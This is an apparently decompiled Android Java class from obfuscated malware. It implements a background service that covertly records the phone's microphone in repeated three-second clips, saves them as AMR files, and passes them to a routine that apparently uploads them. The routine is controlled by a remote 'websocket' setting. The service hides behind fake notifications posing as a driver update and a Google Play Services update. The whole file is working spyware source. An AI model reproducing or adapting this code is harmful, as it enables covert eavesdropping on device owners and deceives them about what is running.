package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.app.Notification.Builder;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build.VERSION;
import android.util.Log;
import java.io.IOException;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.R;

public class brtltydqhiuqbb extends IntentService {

    /* renamed from: a */
    String f522a = "";

    /* renamed from: b */
    boolean f523b;

    /* renamed from: c */
    C0034b f524c = new C0034b();

    /* renamed from: d */
    Context f525d;

    /* renamed from: e */
    private Notification f526e;

    public brtltydqhiuqbb() {
        super("cpysnikhf");
    }

    @TargetApi(16)
    /* renamed from: a */
    private void m340a() {
        this.f526e = new Builder(this.f525d).setContentTitle("Info").setContentText("Update The Driver System..").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f526e);
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo417a(Context context, String str, int i) {
        MediaRecorder mediaRecorder = new MediaRecorder();
        this.f524c.mo213a("SOUND", "START RECORD SOUND");
        this.f523b = false;
        mediaRecorder.setAudioSource(1);
        mediaRecorder.setOutputFormat(3);
        mediaRecorder.setAudioEncoder(1);
        mediaRecorder.setOutputFile(str);
        final int i2 = i;
        final MediaRecorder mediaRecorder2 = mediaRecorder;
        final String str2 = str;
        final Context context2 = context;
        C00851 r0 = new Runnable() {
            public void run() {
                C0034b bVar;
                String str;
                StringBuilder sb;
                try {
                    Thread.sleep((long) (i2 * 1000));
                    try {
                        mediaRecorder2.stop();
                        mediaRecorder2.release();
                        brtltydqhiuqbb.this.f523b = true;
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append("");
                        sb2.append(str2);
                        Log.e("FILE", sb2.toString());
                        brtltydqhiuqbb.this.f524c.mo211a(context2, str2, "", "sound[]");
                    } catch (Exception e) {
                        e = e;
                        bVar = brtltydqhiuqbb.this.f524c;
                        str = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        bVar.mo213a(str, sb.toString());
                    }
                } catch (InterruptedException unused) {
                    try {
                        mediaRecorder2.stop();
                        mediaRecorder2.release();
                        brtltydqhiuqbb.this.f523b = true;
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append("");
                        sb3.append(str2);
                        Log.e("FILE", sb3.toString());
                        brtltydqhiuqbb.this.f524c.mo211a(context2, str2, "", "sound[]");
                    } catch (Exception e2) {
                        e = e2;
                        bVar = brtltydqhiuqbb.this.f524c;
                        str = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        bVar.mo213a(str, sb.toString());
                    }
                } finally {
                    brtltydqhiuqbb.this.f524c.mo213a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder2.stop();
                        mediaRecorder2.release();
                        brtltydqhiuqbb.this.f523b = true;
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append("");
                        sb4.append(str2);
                        Log.e("FILE", sb4.toString());
                        brtltydqhiuqbb.this.f524c.mo211a(context2, str2, "", "sound[]");
                    } catch (Exception e3) {
                        e = e3;
                        bVar = brtltydqhiuqbb.this.f524c;
                        str = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        bVar.mo213a(str, sb.toString());
                    }
                }
            }
        };
        Thread thread = new Thread(r0);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
        } catch (IOException unused) {
        }
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        this.f524c.mo213a("Start", "cpysnikhf");
        this.f525d = this;
        this.f523b = true;
        if (intent.getStringExtra("str").equals("foreground")) {
            if (VERSION.SDK_INT >= 26) {
                C0034b bVar = this.f524c;
                C0034b.m228a((Service) this, "Google", "Update Google Play Service");
            } else {
                m340a();
            }
        }
        loop0:
        while (true) {
            int i = 0;
            while (true) {
                if (this.f523b) {
                    C0034b bVar2 = new C0034b();
                    if (bVar2.mo234e(this, "sound").equals("stop") || bVar2.mo234e(this, "websocket").equals("")) {
                        stopService(intent);
                    } else {
                        try {
                            StringBuilder sb = new StringBuilder();
                            sb.append(getExternalFilesDir(null));
                            sb.append("/");
                            sb.append(i);
                            this.f522a = sb.toString();
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("");
                            sb2.append(this.f522a);
                            sb2.append(".amr");
                            Log.e("+", sb2.toString());
                            Context context = this.f525d;
                            StringBuilder sb3 = new StringBuilder();
                            sb3.append(this.f522a);
                            sb3.append(".amr");
                            mo417a(context, sb3.toString(), 3);
                            i++;
                            if (i >= 10) {
                            }
                        } catch (Exception unused) {
                            bVar2.mo213a("RecordSound", "ERROR!");
                        }
                    }
                }
            }
        }
        stopService(intent);
    }
}
